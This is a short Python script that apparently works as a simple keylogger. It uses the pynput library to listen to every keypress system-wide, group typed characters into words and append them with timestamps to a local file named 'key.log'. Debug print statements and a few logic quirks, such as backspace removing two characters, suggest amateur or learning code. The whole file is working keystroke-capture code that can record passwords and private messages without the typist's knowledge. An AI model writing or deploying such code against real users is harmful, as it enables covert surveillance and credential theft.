from pynput.keyboard import Key, Listener
import logging

word=''
word_count=0
word_count_limit=30

#keys={Key.space:"",Key.enter:"",Key.backspace:
#}

logging.basicConfig(filename='key.log', filemode='a', level=logging.DEBUG,format='%(asctime)s %(message)s')


def on_press(key):
	global word , word_count
	if key==Key.space or key ==Key.enter:
		careter=" "
	elif key==Key.backspace :
		word=word[:-2]
		careter=""
	elif key=="<65027>" :
		careter="@"
	else :
		careter=str(key)[1:-1]
	
	if word_count==word_count_limit or careter==" ":
		word_count=0
		logging.info(word)
		word=""

	elif word_count<word_count_limit and (careter.isalpha() or careter.isnumeric()):
		word_count+=1
		print(f"the {key} key is pressed ")
		word+=str(key)[1:-1]
		print(f"str(key).isalpha()={str(key)[1:-1].isalpha()}")
		print(f"str(key).isalpha()={str(key)[1:-1].isnumeric()}")

	

with Listener(on_press=on_press) as listener:
	listener.join()
